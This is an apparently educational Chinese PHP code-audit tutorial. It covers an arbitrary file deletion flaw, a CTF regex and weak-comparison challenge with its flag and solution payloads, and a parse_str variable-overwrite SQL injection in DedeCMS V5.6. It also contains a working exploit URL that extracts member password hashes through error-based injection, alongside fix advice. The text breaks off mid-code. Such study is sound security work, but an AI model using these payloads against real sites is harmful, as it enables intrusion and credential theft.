<p>选择对应的内容，进入 <strong>if($isnav)</strong> 判断：</p>
<p><img src="/2024/10/10/WebSecurity/codeaudit/phpaudit2/image-33.png"></p>
<p>在上传图标位置输入要删除文件的路径</p>
<p><img src="/2024/10/10/WebSecurity/codeaudit/phpaudit2/image-34.png"></p>
<p>我们建立 <strong>delete.txt</strong> 文件，用于测试任意文件删除：</p>
<p><img src="/2024/10/10/WebSecurity/codeaudit/phpaudit2/image-35.png"></p>
<p>我们点击删除时，就会调用 <strong>file_delete</strong> 函数，同时就会删除掉我们插入到数据库中的图片名：</p>
<p><img src="/2024/10/10/WebSecurity/codeaudit/phpaudit2/image-36.png"></p>
<p><img src="/2024/10/10/WebSecurity/codeaudit/phpaudit2/image-37.png"></p>
<p>这个类型任意文件删除有点类似于二次注入，在添加分类时先把要删除的文件名称插入到数据库中，然后点击删除分类时，会从数据库中取出要删除的文件名。</p>
<h3 id="修复建议-1"><a href="#修复建议-1" class="headerlink" title="修复建议"></a>修复建议</h3><p>漏洞是没有对 <code>$row[&#39;icon&#39;]</code> 参数进行过滤，可以将文件名内容加入目录阶层字符，造成任意文件删除漏洞，所以我们要在传入的参数中过滤”..&#x2F;“等目录阶层字符，避免目录穿越，删除其他文件夹下文件。我们在修复中可以过滤掉 <code>$row[&#39;icon&#39;]</code> 中的目录穿越字符，引入我们自定义的一个函数 <code>checkstr</code> 函数。同时 <code>$row[&#39;icon&#39;]</code> 只是文件的名称，并非是一个路径，因此过滤字符并不会影响到实际功能，对此修复意见我们提供如下代码：</p>
<p><img src="/2024/10/10/WebSecurity/codeaudit/phpaudit2/image-38.png"></p>
<h3 id="题目-1"><a href="#题目-1" class="headerlink" title="题目"></a>题目</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// index.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;flag.php&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span>  (<span class="string">&quot;POST&quot;</span> == <span class="variable">$_SERVER</span>[<span class="string">&#x27;REQUEST_METHOD&#x27;</span>])</span><br><span class="line">&#123;</span><br><span class="line">    <span class="variable">$password</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span> (<span class="number">0</span> &gt;= <span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^[[:graph:]]&#123;12,&#125;$/&#x27;</span>, <span class="variable">$password</span>))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;Wrong Format&#x27;</span>;</span><br><span class="line">        <span class="keyword">exit</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> (<span class="literal">TRUE</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="variable">$reg</span> = <span class="string">&#x27;/([[:punct:]]+|[[:digit:]]+|[[:upper:]]+|[[:lower:]]+)/&#x27;</span>;</span><br><span class="line">        <span class="keyword">if</span> (<span class="number">6</span> &gt; <span class="title function_ invoke__">preg_match_all</span>(<span class="variable">$reg</span>, <span class="variable">$password</span>, <span class="variable">$arr</span>))</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="variable">$c</span> = <span class="number">0</span>;</span><br><span class="line">        <span class="variable">$ps</span> = <span class="keyword">array</span>(<span class="string">&#x27;punct&#x27;</span>, <span class="string">&#x27;digit&#x27;</span>, <span class="string">&#x27;upper&#x27;</span>, <span class="string">&#x27;lower&#x27;</span>);</span><br><span class="line">        <span class="keyword">foreach</span> (<span class="variable">$ps</span> <span class="keyword">as</span> <span class="variable">$pt</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/[[:<span class="subst">$pt</span>:]]+/&quot;</span>, <span class="variable">$password</span>))</span><br><span class="line">            <span class="variable">$c</span> += <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$c</span> &lt; <span class="number">3</span>) <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">if</span> (<span class="string">&quot;42&quot;</span> == <span class="variable">$password</span>) <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">echo</span> <span class="string">&#x27;Wrong password&#x27;</span>;</span><br><span class="line">        <span class="keyword">exit</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// flag.php</span></span><br><span class="line"><span class="meta">&lt;?php</span> <span class="variable">$flag</span> = <span class="string">&quot;HRCTF&#123;Pr3g_R3plac3_1s_Int3r3sting&#125;&quot;</span>;<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>这道题目实际上考察的是大家是否熟悉PHP正则表达式的字符类，当然还涉及到一些弱类型比较问题。大家可以先查阅一下PHP手册对这些字符类的定义，具体可点 <a target="_blank" rel="noopener" href="http://php.net/manual/zh/regexp.reference.character-classes.php">这里</a> 。</p>
<table>
<thead>
<tr>
<th><em>alnum</em></th>
<th>字母和数字</th>
</tr>
</thead>
<tbody><tr>
<td><em>alpha</em></td>
<td>字母</td>
</tr>
<tr>
<td><em>ascii</em></td>
<td>0 - 127的ascii字符</td>
</tr>
<tr>
<td><em>blank</em></td>
<td>空格和水平制表符</td>
</tr>
<tr>
<td><em>cntrl</em></td>
<td>控制字符</td>
</tr>
<tr>
<td><em>digit</em></td>
<td>十进制数(same as \d)</td>
</tr>
<tr>
<td><em>graph</em></td>
<td>打印字符, 不包括空格</td>
</tr>
<tr>
<td><em>lower</em></td>
<td>小写字母</td>
</tr>
<tr>
<td><em>print</em></td>
<td>打印字符,包含空格</td>
</tr>
<tr>
<td><em>punct</em></td>
<td>打印字符, 不包括字母和数字</td>
</tr>
<tr>
<td><em>space</em></td>
<td>空白字符 (比\s多垂直制表符)</td>
</tr>
<tr>
<td><em>upper</em></td>
<td>大写字母</td>
</tr>
<tr>
<td><em>word</em></td>
<td>单词字符(same as \w)</td>
</tr>
<tr>
<td><em>xdigit</em></td>
<td>十六进制数字</td>
</tr>
</tbody></table>
<p>题目中总共有三处正则匹配，我们分别来看一下其对应的含义。<br>第一处的正则 <strong>&#x2F;^[[:graph:]]{12,}$&#x2F;</strong> 为：匹配到可打印字符12个以上(包含12)，<strong>^</strong> 号表示必须以某类字符开头，**$** 号表示必须以某类字符结尾。</p>
<p>第二处正则表达式：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$reg</span> = <span class="string">&#x27;/([[:punct:]]+|[[:digit:]]+|[[:upper:]]+|[[:lower:]]+)/&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="number">6</span> &gt; <span class="title function_ invoke__">preg_match_all</span>(<span class="variable">$reg</span>, <span class="variable">$password</span>, <span class="variable">$arr</span>))</span><br><span class="line">    <span class="keyword">break</span>;</span><br></pre></td></tr></table></figure>
<p>表示字符串中，把连续的符号、数字、大写、小写，作为一段，至少分六段，例如我们输入 <strong>H0ng+Ri</strong> 则匹配到的子串为 <strong>H   0   ng   +   R   i</strong> 。</p>
<p>第三处的正则表达式：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$ps</span> = <span class="keyword">array</span>(<span class="string">&#x27;punct&#x27;</span>, <span class="string">&#x27;digit&#x27;</span>, <span class="string">&#x27;upper&#x27;</span>, <span class="string">&#x27;lower&#x27;</span>);</span><br><span class="line"><span class="keyword">foreach</span> (<span class="variable">$ps</span> <span class="keyword">as</span> <span class="variable">$pt</span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/[[:<span class="subst">$pt</span>:]]+/&quot;</span>, <span class="variable">$password</span>))</span><br><span class="line">    <span class="variable">$c</span> += <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$c</span> &lt; <span class="number">3</span>) <span class="keyword">break</span>;</span><br></pre></td></tr></table></figure>
<p>表示为输入的字符串至少含有符号、数字、大写、小写中的三种类型。然后题目最后将 <strong>$password</strong> 与42进行了弱比较。所以我们的payload为：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">password=<span class="number">42.00e+00000</span></span><br><span class="line">password=<span class="number">420.00000e-1</span></span><br></pre></td></tr></table></figure>

<p>网络上还有一种解法是： <strong>password&#x3D;\x34\x32\x2E</strong> ，但是这种解法并不可行，大家可以思考一下为什么。</p>
<p><img src="/2024/10/10/WebSecurity/codeaudit/phpaudit2/image-39.png"></p>
<p>在 PHP 中，提交形如 <code>password=\x34\x32\x2E</code> 的 payload 是不可行的，主要因为这种表达方式并不会被 PHP 以你可能预期的方式解释。</p>
<ol>
<li><strong>解析方式</strong>：在 PHP 中，字符串 <code>\x34\x32\x2E</code> 会被直接当作普通字符串处理，而不是解释为它们对应的 ASCII 字符。这意味着 <code>\x34</code> 不会被解释为数字 “4”，<code>\x32</code> 不会被解释为数字 “2”，<code>\x2E</code> 不会被解释为点号 “.”。因此，这个字符串实际上是由 <code>\x34\x32\x2E</code> 组成的原始文本，而不是你可能期待的 “42.”。</li>
<li><strong>正则表达式匹配</strong>：因为字符串是按原样处理的，所以在 <code>preg_match(&#39;/^[[:graph:]]&#123;12,&#125;$/&#39;, $password)</code> 这一步，检查密码是否符合至少12个可打印字符的规则时，<code>\x34\x32\x2E</code> 这个字符串不会满足条件。即使它的长度可能超过12个字符，这些字符并不全部是可打印字符。</li>
<li><strong>类型弱比较</strong>：即便这个字符串能够通过前面的正则表达式验证，PHP 在与 “42” 进行弱类型比较时，也会将 <code>\x34\x32\x2E</code> 视为一个普通字符串，这并不会被自动转换成数值 42。PHP 中的弱类型比较通常涉及到数字字符串和整数之间的比较，例如 “42” 与 42 或 “42.0” 与 42 等，但不会将包含非数字字符的字符串视为数值。</li>
</ol>
<p>PS：在 <a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/2523">代码审计Day6 - 正则使用不当导致的路径穿越问题</a> 的文章评论下面，我们提及了一个经典的通过正则写配置文件的案例，这个案例具体怎么绕过并写入shell，大家可以参考 <a target="_blank" rel="noopener" href="https://github.com/wonderkun/CTF_web/tree/dcf36cb9ba9a580a4e8d92b43480b6575fed2c3a/web200-7"> <strong>这里</strong> </a> 。</p>
<h2 id="Bell"><a href="#Bell" class="headerlink" title="Bell"></a>Bell</h2><p>题目叫做钟，代码如下：</p>
<p><img src="/2024/10/10/WebSecurity/codeaudit/phpaudit2/image-40.png"></p>
<p><strong>漏洞解析</strong> ：</p>
<p>这一关其实是考察变量覆盖漏洞，⽽导致这⼀漏洞的发⽣则是不安全的使⽤ <strong>parse_str</strong> 函数。 由于 <strong>第21行</strong> 中的 <strong>parse_str()</strong> 调用，其行为非常类似于注册全局变量。我们通过提交类似 <strong>config[dbhost]&#x3D;127.0.0.1</strong> 这样类型的数据，这样因此我们可以控制 <strong>getUser()</strong> 中第5到8行的全局变量 <strong>$config</strong> 。如果目标存在登陆验证的过程，那么我们就可以通过变量覆盖的方法，远程连接我们自己的mysql服务器，从而绕过这块的登陆验证，进而进行攻击。我们来看看PHP官方对 <strong>parse_str</strong> 函数的定义：</p>
<blockquote>
<p><a target="_blank" rel="noopener" href="http://php.net/manual/zh/function.parse-str.php"> <strong>parse_str</strong> </a></p>
<p><strong>功能</strong> ：parse_str的作用就是解析字符串并且注册成变量，它在注册变量之前不会验证当前变量是否存在，所以会直接覆盖掉当前作用域中原有的变量。</p>
<p><strong>定义</strong> ：<code>void parse_str( string $encoded_string [, array &amp;$result ] )</code></p>
<p>如果 <strong>encoded_string</strong> 是 URL 传入的查询字符串（query string），则将它解析为变量并设置到当前作用域（如果提供了 result 则会设置到该数组里 ）。</p>
</blockquote>
<p><img src="/2024/10/10/WebSecurity/codeaudit/phpaudit2/image-41.png"></p>
<h3 id="实例分析-2"><a href="#实例分析-2" class="headerlink" title="实例分析"></a>实例分析</h3><p>本次实例分析，我们选取的是 <strong>DedeCmsV5.6</strong> 版本。该版本的<strong>buy_action.php</strong>处存在SQL注入漏洞，这里其实和 <strong>parse_str</strong> 有很大关系，下⾯我们来看看具体的漏洞位置。</p>
<p>官网于20140225发布了<strong>V5.7.36</strong> 正式版0225常规更新补丁，这里面的改动一共四个文件 <strong>dede&#x2F;sys_info.php</strong> 、 <strong>dede&#x2F;templets&#x2F;sys_info.htm</strong> 、<strong>include&#x2F;uploadsafe.inc.php</strong> 、<strong>member&#x2F;buy_action.php</strong> 。这里我们关注一下 <strong>member&#x2F;buy_action.php</strong> 这个文件的改动情况。</p>
<p><img src="/2024/10/10/WebSecurity/codeaudit/phpaudit2/image-42.png"></p>
<p>diff一下补丁和源文件：（这里采用sublime的FileDiffs插件来进行diff对比）</p>
<p><img src="/2024/10/10/WebSecurity/codeaudit/phpaudit2/image-43.png"></p>
<p>改动部分，主要针对加密函数的强度进行了加强，所以做一个推断这个漏洞应该是由于 <strong>mchStrCode</strong> 这个编码方法造成的。在读这个函数时发现，如果在我们知道 <strong>cfg_cookie_encode</strong> 的情况下，被编码字符串是可以被逆推出来的。</p>
<p>这个漏洞在乌云上爆出来的时候，是sql注入，所以我推断可能在调用这个编码函数进行解码的地方，解码之后可能没有任何过滤和绕过，又或者可以可绕过过滤，导致sql语句拼接写入到了数据库，而且这里解码的函数可以被攻击者控制，从而导致了SQL注入的产生。</p>
<h3 id="原理分析"><a href="#原理分析" class="headerlink" title="原理分析"></a>原理分析</h3><p>我们全局搜索一下哪些地方调用了这个 <strong>mchStrCode</strong> 函数，发现有三处（可以用sublime <code>Ctrl+Shitf+F</code> 进行搜索）：</p>
<p><img src="/2024/10/10/WebSecurity/codeaudit/phpaudit2/image-44.png"></p>
<p><strong>第17行</strong> (上图)的 <strong>parse_str</strong> 引起了我的兴趣，看一下这一小段代码做了些什么（下图第4行处）：</p>
<p><img src="/2024/10/10/WebSecurity/codeaudit/phpaudit2/image-45.png"></p>
<p>我们重点来看if语句开始时的三行代码， <strong>mchStrCode</strong> 是我们在上一小节通过对比补丁发现变化的函数。也就是说，这个函数可以编码或者解码用户提交的数据，而且 <strong>$pd_encode</strong> 也是我们可以控制的变量。</p>
<p><strong>parse_str</strong> 方法将解码后 <strong>$pd_encode</strong> 中的变量放到 <strong>$mch_Post</strong> 数组中，之后的 <strong>foreach</strong> 语句存在明显的变量覆盖，将 <strong>$mch_Post</strong> 中的key定义为变量，同时将key所对应的value赋予该变量。然后，再向下就是执行SQL查询了。</p>
<p>在这个过程中存在一个明显的疏忽是，没有对定义的 <strong>key</strong> 进行检查，导致攻击者可以通过 <strong>mschStrCode</strong> 对攻击代码进行编码，从而绕过GPC和其他过滤机制，使攻击代码直达目标。我们再来看看 <strong>mchStrCode</strong> 函数的代码：</p>
<p><img src="/2024/10/10/WebSecurity/codeaudit/phpaudit2/image-46.png"></p>
<p>上图我们要注意第三行 <strong>$key</strong> 值的获取方法：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$key</span> = <span class="title function_ invoke__">substr</span>(<span class="title function_ invoke__">md5</span>(<span class="variable">$_SERVER</span>[<span class="string">&quot;HTTP_USER_AGENT&quot;</span>].<span class="variable">$GLOBALS</span>[<span class="string">&#x27;cfg_cookie_encode&#x27;</span>]),<span class="number">8</span>,<span class="number">18</span>);</span><br></pre></td></tr></table></figure>

<p>这里将 <strong>$_SERVER[“HTTP_USER_AGENT”]</strong> 和 <strong>$GLOBALS[‘cfg_cookie_encode’]</strong> 进行拼接，然后进行md5计算之后取前 <strong>18</strong> 位字符，其中的 <strong>$_SERVER[“HTTP_USER_AGENT”]</strong> 是浏览器的标识，可以被我们控制，关键是这个 <strong>$GLOBALS[‘cfg_cookie_encode’]</strong> 是怎么来的。通过针对补丁文件的对比，发现了 <strong>&#x2F;install&#x2F;index.php</strong> 的 <strong>$rnd_cookieEncode</strong> 字符串的生成同样是加强了强度， <strong>$rnd_cookieEncode</strong> 字符串最终也就是前面提到的 <strong>$GLOBALS[‘cfg_cookie_encode’]</strong> </p>
<p><img src="/2024/10/10/WebSecurity/codeaudit/phpaudit2/image-47.png"></p>
<p>看看源代码里是怎么处理这个的 <strong>$rnd_cookieEncode</strong> 变量的。</p>
<p><img src="/2024/10/10/WebSecurity/codeaudit/phpaudit2/image-48.png"></p>
<p>这段代码生成的加密密匙很有规律，所有密匙数为26^6*(9999-1000)&#x3D;2779933068224,把所有可能的组合生成字典，用passwordpro暴力跑MD5或者使用GPU来破解，破解出md5过的密匙也花不了多少时间。 当然这个是完全有可能的，但是很耗时间，所以下一步看看有没有办法能够绕过这个猜测的过程，让页面直接回显回来。</p>
<h3 id="利用思路"><a href="#利用思路" class="headerlink" title="利用思路"></a>利用思路</h3><p>虽然整个漏洞利用原理很简单，但是利用难度还是很高的，关键点还是如何解决这个 <strong>mchStrCode</strong> ， <strong>mchStrCode</strong> 这个函数的编码过程中需要知道网站预设的 <strong>cfg_cookie_encode</strong> ，而这个内容在用户界面只可以获取它的MD5值。虽然<strong>cfg_cookie_encode</strong>的生成有一定的规律性，我们可以使用MD5碰撞的方法获得，但是时间成本太高，感觉不太值得。所以想法是在什么地方可以使用 <strong>mchStrCode</strong> 加密可控参数，并且能够返回到页面中。所以搜索一下全文哪里调用了这个函数。</p>
<p>于是，我们在 <strong>member&#x2F;buy_action.php</strong> 的104行找到了一处加密调用：**$pr_encode &#x3D; str_replace(‘&#x3D;’, ‘’, mchStrCode($pr_encode));** 我们来看一下这个分支的整个代码：</p>
<p><img src="/2024/10/10/WebSecurity/codeaudit/phpaudit2/image-49.png"></p>
<p>这里的 <strong>第38行</strong> 有一 <code>$tpl-&gt;LoadTemplate(DEDEMEMBER.&#39;/templets/buy_action_payment.htm&#39;);</code> 在 <strong>&#x2F;templets&#x2F;buy_action_payment.htm</strong> 中，我找到了页面上回显之前加密的 <strong>$pr_encode</strong> 和 <strong>$pr_verify</strong> 。</p>
<p><img src="/2024/10/10/WebSecurity/codeaudit/phpaudit2/image-50.png"></p>
<p>通过这部分代码，我们可以通过 <strong>[cfg_dbprefix&#x3D;SQL注入]</strong> 的提交请求，进入这个分支，让它帮助我来编码 <strong>[cfg_dbprefix&#x3D;SQL注入]</strong> ，从而获取相应的 <strong>pr_encode</strong> 和 <strong>pr_verify</strong> 。 但是 <strong>common.inc.php</strong> 文件对用户提交的内容进行了过滤，凡提交的值以cfg、GLOBALS、GET、POST、COOKIE 开头都会被拦截，如下图第11行。</p>
<p><img src="/2024/10/10/WebSecurity/codeaudit/phpaudit2/image-51.png"></p>
<p>这个问题的解决就利用到了 <strong>$REQUEST</strong> 内容与 <strong>parse_str</strong> 函数内容的差异特性。我们url传入的时候通过**[a&#x3D;1&amp;b&#x3D;2%26c&#x3D;3]<strong>这样的提交时， <strong>$REQUEST</strong> 解析的内容就是 <strong>[a&#x3D;1，b&#x3D;2%26c&#x3D;3]</strong> 。而通过上面代码的遍历进入 <strong>parse_str</strong> 函数的内容则是 <strong>[a&#x3D;1&amp;b&#x3D;2&amp;c&#x3D;3]</strong> ，因为 <strong>parse_str</strong> 函数会针对传入进来的数据进行解码，所以解析后的内容就变成了</strong>[a&#x3D;1，b&#x3D;2，c&#x3D;3]**。所以可以通过这种方法绕过 <strong>common.inc.php</strong> 文件对于参数内容传递的验证。</p>
<h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>访问 <strong>buy_action.php</strong> 文件，使用如下参数：</p>
<figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">product</span>=<span class="selector-tag">card</span><span class="selector-tag">&amp;</span><span class="selector-tag">pid</span>=<span class="number">1</span><span class="selector-tag">&amp;</span><span class="selector-tag">a</span>=<span class="number">1%</span><span class="number">26</span><span class="selector-tag">cfg_dbprefix</span>=<span class="selector-tag">dede_member_operation</span> <span class="selector-tag">WHERE</span> <span class="number">1</span>=@&#x27;/!<span class="number">12345</span><span class="selector-tag">union</span>/ <span class="selector-tag">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">8</span>,<span class="number">9</span>,<span class="number">10</span> <span class="selector-tag">FROM</span> (SELECT <span class="built_in">COUNT</span>(),<span class="built_in">CONCAT</span>( (SELECT pwd FROM dede_member LIMIT <span class="number">0</span>,<span class="number">1</span>),<span class="built_in">FLOOR</span>(<span class="built_in">RAND</span>(<span class="number">0</span>)<span class="number">2</span>))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)<span class="selector-tag">a</span> %<span class="number">23</span></span><br></pre></td></tr></table></figure>

<p>其中 <strong>product</strong> 和 <strong>pid</strong> 参数是为了让我们进入 <strong>mchStrCode</strong> 对传入数据进行编码的分支，参数 <strong>a</strong> 是为了配合上面提到的差异性而随意添加的参数。从 <strong>cfg_dbprefix</strong> 开始，便是真正的SQL注入攻击代码。 访问该URL后，在页面源码中找到 <strong>pd_encode</strong> 和 <strong>pd_verify</strong> 字段的值，由于用户 <strong>Cookie</strong> 和 <strong>User-Agent</strong> 不同，所获取的值也不同，然后在页面上找到了 <strong>pd_encode</strong> 和 <strong>pd_verify</strong>的值，如下图：</p>
<p><img src="/2024/10/10/WebSecurity/codeaudit/phpaudit2/image-52.png"></p>
<p>最后再构造一下payload就好了：</p>
<figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1//dedecms5.6/member/buy_action.php?pd_encode=QEpWVhZbEV9SUkBUEEBfAF8CFlkEA0VbAwVuV1BARFVQDRoOVF1dVzxVAA9TVkBvWUBTFgNHWVdXEjRwIDB0EwMNdhcZRVMBAwwMRw1RCgweE0FVWlVVEEICHAoVAU8MSVcdBR4HGggaXU4CABh/YCx1RUpidn51dWQWJy1mfmwRG097KixycmYYFhhlIS52c2wZQhRcRSRjfH8QUlVSAT1eVVVbVxEYKSt8emYQBhwHTU51fHd2YEtqJCx1GwIZBBkfHEJ1Ynd0Eip2Iy1jfnNkf394OzFweH10c017LSNjcnFkc2JpNydnYxh+YCxtNUJzahJIH1EWR0RmfWddWxBMDAxSR1tUCwEAUFEEBV4JVFEBUVYIHgIHAQRQXAQHCAsLAAIBSFYJBgUGUB0HVwEFCAgUA1UMVlUEVQJWBFIBUAQVc3ZjaCd5MSMAAwIABgYBU1IHDQkBB1IIVVMBBQcdBwUEXVsABwsKAU5QERZBFgFxEwJwQVB1AQELHFIOXUwDBwoeBwIPQVB1TAkMAFoBVlUCAAEWVFRFDANBVWdfWxFLEQtcVg8BAwMGVFMEBg8PBVUAQzJ5Y2F1ZWN/IF9XA1tdBFVeVAcIAlRVDlJVAFtRVV5YC1INAVsHBgpUBBZyAQZWZUtcQCp8WFAXd1dUU2VFARB6dGdmUQh1AVcMAABVAVJSVVcKAABdAlAAA0R1VlZVel9RDQxnWVVcD1INVlICAAICBwQQIAdXVXRWVQpWMQtcVm1vVVt7AFcOAl4IAlANBFUGVlMFBFIHUA&amp;pd_verify=fbe183b4c5a69ac7fb394a4b5cd5cfcb</span><br></pre></td></tr></table></figure>

<p>再次提醒，因为每个人的 <strong>cookie</strong> 和 <strong>User-Agent</strong> 都不一样，所以生成的也不一样，建议大家自己生成一下。</p>
<h3 id="修复建议-2"><a href="#修复建议-2" class="headerlink" title="修复建议"></a>修复建议</h3><p>为了解决变量覆盖问题，可以在注册变量前先判断变量是否存在，如果使用 <strong>extract</strong> 函数可以配置第二个参数是 <strong>EXTR_SKIP</strong> 。使用 <strong>parse_str</strong> 函数之前先自行通过代码判断变量是否存在。</p>
<p>这里提供一个demo漏洞样例代码，以及demo的修复方法。</p>
<p><strong>demo漏洞</strong></p>
<p><img src="/2024/10/10/WebSecurity/codeaudit/phpaudit2/image-53.png"></p>
<p><strong>demo漏洞修复</strong></p>
<p><img src="/2024/10/10/WebSecurity/codeaudit/phpaudit2/image-54.png"></p>
<h3 id="题目-2"><a href="#题目-2" class="headerlink" title="题目"></a>题目</h3><p>看完了上述分析，不知道大家是否对 <strong>parse_str()</strong> 函数有了更加深入的理解，文中用到的CMS可以从 <a target="_blank" rel="noopener" href="http://www.dedecms.com/upimg/soft/2010/DedeCmsV5.6-UTF8-Final.tar.gz">这里</a> 下载，当然文中若有不当之处，还望各位斧正。如果你对我们的项目感兴趣，欢迎发送邮件到 <strong><a href="mailto:&#x68;&#x6f;&#x6e;&#x67;&#x72;&#105;&#x73;&#x65;&#99;&#64;&#103;&#x6d;&#97;&#x69;&#108;&#46;&#x63;&#111;&#x6d;">&#x68;&#x6f;&#x6e;&#x67;&#x72;&#105;&#x73;&#x65;&#99;&#64;&#103;&#x6d;&#97;&#x69;&#108;&#46;&#x63;&#111;&#x6d;</a></strong> 联系我们。<strong>Day7</strong> 的分析文章就到这里，我们最后留了一道CTF题目给大家练手，题目如下：</p>
<p><strong>index.php</strong></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//index.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span> = “hongri”;</span><br><span class="line"><span class="variable">$id</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>];</span><br><span class="line">@<span class="title function_ invoke__">parse_str</span>(<span class="variable">$id</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$a</span>[<span class="number">0</span>] != <span class="string">&#x27;QNKCDZO&#x27;</span> &amp;&amp; <span class="title function_ invoke__">md5</span>(<span class="variable">$a</span>[<span class="number">0</span>]) == <span class="title function_ invoke__">md5</span>(<span class="string">&#x27;QNKCDZO&#x27;</span>)) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;&lt;a href=&quot;uploadsomething.php&quot;&gt;flag is here&lt;/a&gt;&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//uploadsomething.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&quot;Content-type:text/html;charset=utf-8&quot;</span>);</span><br><span class="line"><span class="variable">$referer</span> = <span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_REFERER&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$referer</span>)!== <span class="literal">false</span>) &#123;</span><br><span class="line">    <span class="variable">$savepath</span> = <span class="string">&quot;uploads/&quot;</span> . <span class="title function_ invoke__">sha1</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>]) . <span class="string">&quot;/&quot;</span>;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="title function_ invoke__">is_dir</span>(<span class="variable">$savepath</span>)) &#123;</span><br><span class="line">        <span class="variable">$oldmask</span> = <span class="title function_ invoke__">umask</span>(<span 